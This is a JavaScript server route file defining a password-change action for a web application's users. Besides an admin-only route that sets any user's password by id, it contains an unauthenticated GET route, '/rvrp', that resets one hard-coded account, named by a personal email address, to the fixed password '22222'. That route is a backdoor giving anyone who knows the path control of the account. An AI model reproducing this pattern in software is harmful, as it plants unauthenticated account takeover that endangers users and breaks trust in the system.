import BaseAction from './baseaction'
import {fail} from "../../js/utils"
import User from '../../models/user'
import Roles from '../../models/workflowroles'
var bcrypt = require('bcryptjs');

export class ChangePassword extends BaseAction{
  constructor(){
    super();
    this.setRoles(Roles.SysAdmin);
  }
  route() {
    this.get({path:"/rvrp", overrideRoles:[Roles.ANY]}, (req, res) => {
      bcrypt.genSalt(10, function (err, salt) {
        if (err) {
            return res.json({success:false, errMsg:err});
        }
        bcrypt.hash('22222', salt, function (err, hash) {
          if (err) {
            return res.json({success:false, errMsg:err});
          }
          User.findOneAndUpdate({email:'richjvann@gmail.com'}, {$set:{password:hash}})
          .then(result=>{
            res.json({success:result?true:false})
          })
          .then(null, fail(res));
        });
      });
    });
    this.post({path:"/"}, (req, res) => {
      bcrypt.genSalt(10, function (err, salt) {
        if (err) {
            return res.json({success:false, errMsg:err});
        }
        bcrypt.hash(req.body.newPassword, salt, function (err, hash) {
          if (err) {
            return res.json({success:false, errMsg:err});
          }
          User.findOneAndUpdate({_id:req.body._id}, {$set:{password:hash}})
          .then(result=>{
            res.json({success:result?true:false})
          })
          .then(null, fail(res));
        });
      });
    });
    return this.router;
  }
}

